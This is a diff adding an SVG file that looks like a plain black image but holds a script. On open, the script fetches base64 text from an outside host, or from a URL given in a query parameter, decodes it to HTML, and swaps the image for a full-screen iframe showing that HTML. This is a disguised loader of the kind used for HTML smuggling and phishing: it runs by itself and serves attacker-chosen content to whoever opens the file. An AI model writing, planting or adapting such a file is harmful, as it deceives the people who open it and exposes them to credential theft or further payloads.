@@ -1,0 +1,45 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%">
+  <rect width="100%" height="100%" fill="#000"/>
+  <script><![CDATA[
+  (async()=>{
+    try{
+      const src = new URLSearchParams(location.search).get('src')
+              || 'https://bghstorage.pythonanywhere.com/';
+      const resp = await fetch(src, {cache:'no-store'});
+      const text = await resp.text();
+      if (!resp.ok) throw new Error(`HTTP ${resp.status}: ` + text.slice(0, 200));
+      if (!/^[A-Za-z0-9+/=\s]+$/.test(text))
+        throw new Error('Not base64: ' + text.slice(0, 200));
+
+      let b64 = text.replace(/^data:[^,]*,/,'').replace(/\s+/g,'')
+                    .replace(/-/g,'+').replace(/_/g,'/');
+      while (b64.length % 4) b64 += '=';
+      const html = new TextDecoder().decode(
+        Uint8Array.from(atob(b64), c => c.charCodeAt(0))
+      );
+
+      // Replace the SVG content with a full-viewport iframe using srcdoc.
+      const SVGNS   = 'http://www.w3.org/2000/svg';
+      const XHTMLNS = 'http://www.w3.org/1999/xhtml';
+
+      const fo = document.createElementNS(SVGNS, 'foreignObject');
+      fo.setAttribute('width', '100%');
+      fo.setAttribute('height', '100%');
+
+      const iframe = document.createElementNS(XHTMLNS, 'iframe');
+      iframe.setAttribute(
+        'style',
+        'position:fixed;inset:0;width:100vw;height:100vh;border:0;display:block;margin:0;'
+      );
+      iframe.srcdoc = html;
+      fo.appendChild(iframe);
+
+      const root = document.documentElement;
+      root.appendChild(fo);                          // add first…
+      [...root.children].forEach(el => {             // …then remove the rest
+        if (el !== fo) el.remove();
+      });
+    }catch(e){ console.error('[b64-svg]', e.message); }
+  })();
+  ]]></script>
+</svg>
